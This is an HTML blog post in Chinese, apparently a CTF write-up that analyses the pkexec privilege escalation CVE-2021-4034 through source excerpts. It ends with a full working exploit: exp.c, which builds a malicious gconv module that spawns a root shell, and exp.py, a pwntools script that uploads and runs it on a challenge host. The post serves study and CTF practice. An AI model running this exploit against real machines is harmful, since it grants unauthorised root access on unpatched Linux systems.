<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>CVE-2021-4034 Polkit-Pkexec | kotori的菜园</title>
<link rel="shortcut icon" href="https://kotoriseed.github.io//favicon.ico?v=1718591155332">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://kotoriseed.github.io//styles/main.css">
<link rel="alternate" type="application/atom+xml" title="CVE-2021-4034 Polkit-Pkexec | kotori的菜园 - Atom Feed" href="https://kotoriseed.github.io//atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">


<script async src="https://www.googletagmanager.com/gtag/js?id=G-PJDEM99E9P"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-PJDEM99E9P');
</script>


    <meta name="description" content="前几天做Realworld体验赛的时候有一题Be-a-PK-LPE-Master，考查了对CVE-2021-4034的利用。当时是直接非预期的所以没有深究。
现在用预期解来复现一下，顺便借此环境分析一下CVE-2021-4034。
分析
C..." />
    <meta name="keywords" content="CVE" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://kotoriseed.github.io/">
  <img class="avatar" src="https://kotoriseed.github.io//images/avatar.png?v=1718591155332" alt="">
  </a>
  <h1 class="site-title">
    kotori的菜园
  </h1>
  <p class="site-description">
    挑战者贵为永恒黄金
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          首页
        </a>
      
    
      
        <a href="/archives" class="menu">
          归档
        </a>
      
    
      
        <a href="/tags" class="menu">
          标签
        </a>
      
    
      
        <a href="/post/friends" class="menu">
          友链
        </a>
      
    
      
        <a href="/post/about" class="menu">
          关于
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              CVE-2021-4034 Polkit-Pkexec
            </h2>
            <div class="post-info">
              <span>
                2023-01-12
              </span>
              <span>
                10 min read
              </span>
              
                <a href="https://kotoriseed.github.io/tag/b5l9Cu9ID/" class="post-tag">
                  # CVE
                </a>
              
            </div>
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <p>前几天做Realworld体验赛的时候有一题<strong>Be-a-PK-LPE-Master</strong>，考查了对<strong>CVE-2021-4034</strong>的利用。当时是直接非预期的所以没有深究。</p>
<p>现在用预期解来复现一下，顺便借此环境分析一下<strong>CVE-2021-4034</strong>。</p>
<h1 id="分析">分析</h1>
<p><code>CVE-2021-4034</code>是存在于<code>Polkit</code>中的<code>pkexec</code>的提权漏洞，影响到的linux版本不计其数。</p>
<p>pkexec是一个拥有suid权限的程序，可以被利用来执行root权限的命令。（web手应该都很熟悉suid提权）</p>
<p>但是glibc会在特权程序执行的时候清除敏感环境变量，以此来保证系统的安全性</p>
<pre><code class="language-c">void
_dl_non_dynamic_init (void)
{
  ......
      
  if (__libc_enable_secure)  //判断特权模式
    {
      static const char unsecure_envvars[] =
	UNSECURE_ENVVARS
#ifdef EXTRA_UNSECURE_ENVVARS
	EXTRA_UNSECURE_ENVVARS
#endif
	;
      const char *cp = unsecure_envvars;

      while (cp &lt; unsecure_envvars + sizeof (unsecure_envvars))  //在此全部清空
	{
	  __unsetenv (cp);
	  cp = (const char *) __rawmemchr (cp, '\0') + 1;
	}

#if !HAVE_TUNABLES
      if (__access (&quot;/etc/suid-debug&quot;, F_OK) != 0)
	__unsetenv (&quot;MALLOC_CHECK_&quot;);
#endif
    }
    ......
        
}
</code></pre>
<p>对<code>unsecure_envvars</code>的定义如下：</p>
<pre><code class="language-c">#if !HAVE_TUNABLES
# define GLIBC_TUNABLES_ENVVAR &quot;GLIBC_TUNABLES\0&quot;
#else
# define GLIBC_TUNABLES_ENVVAR
#endif

/* Environment variable to be removed for SUID programs.  The names are
   all stuffed in a single string which means they have to be terminated
   with a '\0' explicitly.  */
#define UNSECURE_ENVVARS \
  &quot;GCONV_PATH\0&quot;							      \
  &quot;GETCONF_DIR\0&quot;							      \
  GLIBC_TUNABLES_ENVVAR							      \
  &quot;HOSTALIASES\0&quot;							      \
  &quot;LD_AUDIT\0&quot;								      \
  &quot;LD_DEBUG\0&quot;								      \
  &quot;LD_DEBUG_OUTPUT\0&quot;							      \
  &quot;LD_DYNAMIC_WEAK\0&quot;							      \
  &quot;LD_HWCAP_MASK\0&quot;							      \
  &quot;LD_LIBRARY_PATH\0&quot;							      \
  &quot;LD_ORIGIN_PATH\0&quot;							      \
  &quot;LD_PRELOAD\0&quot;							      \
  &quot;LD_PROFILE\0&quot;							      \
  &quot;LD_SHOW_AUXV\0&quot;							      \
  &quot;LD_USE_LOAD_BIAS\0&quot;							      \
  &quot;LOCALDOMAIN\0&quot;							      \
  &quot;LOCPATH\0&quot;								      \
  &quot;MALLOC_TRACE\0&quot;							      \
  &quot;NIS_PATH\0&quot;								      \
  &quot;NLSPATH\0&quot;								      \
  &quot;RESOLV_HOST_CONF\0&quot;							      \
  &quot;RES_OPTIONS\0&quot;							      \
  &quot;TMPDIR\0&quot;								      \
  &quot;TZDIR\0&quot;
</code></pre>
<p>所以是没法直接使用特权程序来做一些比较危险的操作的。</p>
<p>但是在<code>pkexec</code>的主函数中，有以下代码</p>
<pre><code class="language-c">for (n = 1; n &lt; (guint) argc; n++)
    {
      ......
    }
......
    
  if (path[0] != '/')
    {
      /* g_find_program_in_path() is not suspectible to attacks via the environment */
      s = g_find_program_in_path (path);
      if (s == NULL)
        {
          g_printerr (&quot;Cannot run program %s: %s\n&quot;, path, strerror (ENOENT));
          goto out;
        }
      g_free (path);
      argv[n] = path = s;
    }
......
</code></pre>
<p>他在处理参数的时候，下标<code>n</code>是<strong>从1开始遍历</strong>的，并在后续代码中使用了<code>argv[n] = path = s</code>来赋值。</p>
<p>那么假如我们的<strong>argc为0</strong>呢，这一句就会变成<code>argv[1] = path = s</code>，这是明显存在越界的。</p>
<p>而且，<code>argv</code>和前面提到的环境变量，也就是<code>envp</code>的数组<strong>在内存中恰好又是连续的</strong>。</p>
<p>所以说，这个漏洞使得危险环境变量可以被重新注入。</p>
<p>但是继续阅读源码就会发现，在环境变量注入不久之后，程序对环境变量进行了完全清除。</p>
<pre><code class="language-c">if (clearenv () != 0)
    {
      g_printerr (&quot;Error clearing environment: %s\n&quot;, g_strerror (errno));
      goto out;
    }
</code></pre>
<p>因此，利用手段变得富有挑战性了起来。</p>
<h1 id="利用">利用</h1>
<h2 id="让argc为0">让argc为0</h2>
<p>通常情况下，argc其实最少都是1的，因为argv[0]指向程序本身。</p>
<p>但如果使用execve来调用程序，并对argv传NULL，argc就会变为0（也许对此情况的疏忽就恰是本漏洞的成因）</p>
<h2 id="劫持环境变量">劫持环境变量</h2>
<p>再来回顾一下漏洞点的代码</p>
<pre><code class="language-c">path = g_strdup (argv[n]);  //存在越界读，读出envp[0]
......
    
  if (path[0] != '/')
    {
      s = g_find_program_in_path (path);  //找到envp[0]的绝对路径
	......
        
      argv[n] = path = s;  //存在越界写，将envp[0]修改为其绝对路径
    }
</code></pre>
<p>能够劫持<code>g_find_program_in_path (path)</code>的返回值的话，就能注入一个任意环境变量到argv[1] (即envp[0])。</p>
<p>所以，如果让envp符合</p>
<pre><code class="language-c">char * const environ[] = {&quot;exp.so&quot;, &quot;PATH=LD_PRELOAD=.&quot;, NULL};
</code></pre>
<p>并且提前部署好一个名为<code>LD_PRELOAD=.</code>这个文件夹，且在<code>LD_PRELOAD=.</code>目录下存在<code>exp.so</code>这样一个文件，本目录下再有一个恶意的<code>exp.so</code>，就能成功达成对恶意环境变量的注入。（把<code>LD_PRELOAD</code>换成<code>unsecure_envvars</code>中的任意一个都行，具体过程根据利用思路稍作调整）</p>
<h2 id="利用g_printerr来getshell">利用g_printerr来getshell</h2>
<p>有了注入危险环境变量的能力，结合源代码分析getshell思路就不是一件难事了。</p>
<p>重点放在注入环境变量之后，环境变量被重新清除之前，</p>
<pre><code class="language-c">if (access (path, F_OK) != 0)
    {
      g_printerr (&quot;Error accessing %s: %s\n&quot;, path, g_strerror (errno));
      goto out;
    }
  command_line = g_strjoinv (&quot; &quot;, argv + n);
  exec_argv = argv + n;

  rc = getpwnam_r (opt_user, &amp;pwstruct, pwbuf, sizeof pwbuf, &amp;pw);
  if (rc == 0 &amp;&amp; pw == NULL)
    {
      g_printerr (&quot;User `%s' does not exist.\n&quot;, opt_user);
      goto out;
    }
  else if (pw == NULL)
    {
      g_printerr (&quot;Error getting information for user `%s': %s\n&quot;, opt_user, g_strerror (rc));
      goto out;
    }
for (n = 0; environment_variables_to_save[n] != NULL; n++)
    {
      const gchar *key = environment_variables_to_save[n];
      const gchar *value;

      value = g_getenv (key);
      if (value == NULL)
        continue;

      if (!validate_environment_variable (key, value))
        goto out;

      g_ptr_array_add (saved_env, g_strdup (key));
      g_ptr_array_add (saved_env, g_strdup (value));
    }
</code></pre>
<p>这里我们选择的攻击对象就是<code>g_printerr</code>，他的作用和printf很像，但是当环境变量存在<code>CHARSET</code>（这个环境变量并没有被认为是不安全的），且值不为<code>UTF-8</code>时，他就会调用glibc中的函数<code>iconv_open</code>来尝试从<code>gconv-modules</code>中读取相应的so文件来转换字符集。</p>
<p>并且这个<code>gconv-modules</code>的路径是由<code>GCONV_PATH</code>这个环境变量指定的，结合此前的环境变量注入，只需要再构造一个恶意so来让g_printerr调用即可getshell。</p>
<p><code>gconv-modules</code>解析的格式是一个三元组：</p>
<pre><code>module UTF-8// EXP// exp 2
</code></pre>
<p>(从UTF-8转换为EXP需要调用exp.so中的<code>gconv_init</code>)</p>
<p>如何触发<code>g_printerr</code>呢？其实也很简单。</p>
<p>在<code>validate_environment_variable</code>函数中，</p>
<pre><code class="language-c">static gboolean
validate_environment_variable (const gchar *key,
                               const gchar *value)
{
    if (g_strcmp0 (key, &quot;SHELL&quot;) == 0)
    {
      /* check if it's in /etc/shells */
      if (!is_valid_shell (value))
        {
          log_message (LOG_CRIT, TRUE,
                       &quot;The value for the SHELL variable was not found the /etc/shells file&quot;);
          g_printerr (&quot;\n&quot;
                      &quot;This incident has been reported.\n&quot;);
          goto out;
        }
    }
    ......
        
}
</code></pre>
<p>如果有<code>SHELL</code>这个环境变量，且他的value并不在<code>/etc/shells</code>中时，就会调用<code>log_message</code>和<code>g_printerr</code>。</p>
<p>(这里给出<code>/etc/shells</code>的内容)</p>
<pre><code># /etc/shells: valid login shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/tmux
/bin/zsh
/usr/bin/zsh
</code></pre>
<h2 id="综合利用">综合利用</h2>
<p>下面以今年RealworldCTF体验赛的这道<strong>Be-a-PK-LPE-Master</strong>为例，复现一遍此漏洞的利用过程。</p>
<p>首先在本地做好准备，写好<code>exp.c</code></p>
<p>然后nc连上远程主机，拿到普通用户的shell之前需要先处理一个PoW挖矿的问题（爆破5bytes字符来构造一个存在26bits前缀0的sha256的hash）。这一步直接利用pwntools中的mbruteforce模块即可。</p>
<p>登录的时候使用<code>user</code>空口令登录，然后将编译好的exp传到靶机上。</p>
<p>成功提权</p>
<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/14/f7d461bd770de.png" alt="1673665037592.png" loading="lazy"></figure>
<h3 id="expc">exp.c</h3>
<pre><code class="language-c">#include&lt;unistd.h&gt;
#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;

char code[] =
	&quot;#include&lt;unistd.h&gt;\n&quot;
	&quot;#include&lt;stdio.h&gt;\n&quot;
	&quot;#include&lt;stdlib.h&gt;\n&quot;
	&quot;void gconv() {}\n&quot;
	&quot;void gconv_init(){\n&quot;
	&quot;  setuid(0); setgid(0);\n&quot;
	&quot;  seteuid(0); setegid(0);\n&quot;
	&quot;  char * const args[] = { \&quot;/bin/sh\&quot;, NULL };\n&quot;
	&quot;  char * const environ[] = { \&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\&quot;, NULL };\n&quot;
	&quot;  execve(args[0], args, environ);\n&quot;
	&quot;  exit(0);\n&quot;
	&quot;}\n&quot;;

int main(){
	system(&quot;mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'&quot;);
	system(&quot;mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' &gt; pwnkit/gconv-modules&quot;);
	system(&quot;chmod a+x 'GCONV_PATH=./pwnkit'&quot;);

	FILE *fp = fopen(&quot;pwnkit/pwnkit.c&quot;, &quot;w&quot;);
	fprintf(fp, &quot;%s&quot;, code);
	fclose(fp);
	system(&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;);

	char *args[] = {NULL};
	char *env[] = {&quot;pwnkit&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PWNKIT&quot;, &quot;SHELL=/ko/to/ri&quot;, NULL};
	execve(&quot;/usr/bin/pkexec&quot;, args, env);
	return 0;
}

</code></pre>
<h3 id="exppy">exp.py</h3>
<pre><code class="language-python">from hashlib import sha256
import sys
import os
from pwn import *
from pwnlib.util.iters import mbruteforce
import string

context.log_level='debug'

USR = 'user'
PW  = ''

sla = lambda x,y : p.sendlineafter(x,y)
sa =  lambda x,y : p.sendafter(x,y)
ru =  lambda x   : p.recvuntil(x)

p = remote('47.98.99.193', 6666)

prefixes = str(ru(b'&quot;+')[-7:-2])[2:-1]
print(prefixes)

# raw_input()

def brute(cur):

    content = prefixes + str(cur)
    s = sha256(content.encode())
    if s.hexdigest().startswith(&quot;000000&quot;) and int(s.hexdigest()[6:8], 16) &lt; 0x40:
        return True

    return False

def send_cmd(cmd):
	sla('$ ', cmd)

def upload():
	lg = log.progress('Upload')
	with open('exp', 'rb') as f:
		data = f.read()
	encoded = base64.b64encode(data)
	encoded = str(encoded)[2:-1]
	for i in range(0, len(encoded), 300):
		lg.status('%d / %d' % (i, len(encoded)))
		send_cmd('echo -n &quot;%s&quot; &gt;&gt; benc' % (encoded[i:i+300]))
	send_cmd('cat benc | base64 -d &gt; bout')
	send_cmd('chmod +x bout')
	lg.success()

def login(username, passwd):
	sla('login: ', username)
	# sla('Password: ', passwd)


res = mbruteforce(brute, string.ascii_lowercase + string.digits, method = 'upto', length=6,  threads = 20)
print(res)

sla('zero:', res)

login(USR, PW)

os.system('musl-gcc -w -s -static -o3 exp.c -o exp')
upload()

p.interactive()
</code></pre>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#%E5%88%86%E6%9E%90">分析</a></li>
<li><a href="#%E5%88%A9%E7%94%A8">利用</a>
<ul>
<li><a href="#%E8%AE%A9argc%E4%B8%BA0">让argc为0</a></li>
<li><a href="#%E5%8A%AB%E6%8C%81%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">劫持环境变量</a></li>
<li><a href="#%E5%88%A9%E7%94%A8g_printerr%E6%9D%A5getshell">利用g_printerr来getshell</a></li>
<li><a href="#%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8">综合利用</a>
<ul>
<li><a href="#expc">exp.c</a></li>
<li><a href="#exppy">exp.py</a></li>
</ul>
</li>
</ul>
</li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">下一篇</div>
            <a href="https://kotoriseed.github.io/post/2022YearEndSummary/">
              <h3 class="post-title">
                2022年终总结
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  
  <a class="rss" href="https://kotoriseed.github.io//atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
